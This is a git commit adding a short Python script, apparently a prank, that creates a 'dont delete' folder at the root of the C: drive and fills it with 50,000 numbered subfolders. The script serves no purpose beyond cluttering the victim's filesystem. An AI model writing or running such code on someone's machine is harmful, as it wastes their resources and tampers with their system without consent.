0b5b437f5d954d7b7a855f230a031c656197e5a8
Md Ridoy Hossain <inception.helps@gmail.com>
2023-03-30 22:34:40 +0600

    version 0.0

---
+++ main.py
@@ -0,0 +1,13 @@
+# Please Subscribe my youtube channel "Problem Solve with Ridoy"
+import os
+
+path = "C:\\"
+os.makedirs(f"{path}dont delete")
+count = 0
+while count < 50000:
+    os.makedirs(f"{path}dont delete\\{count}")
+    count += 1
+
+
+
+
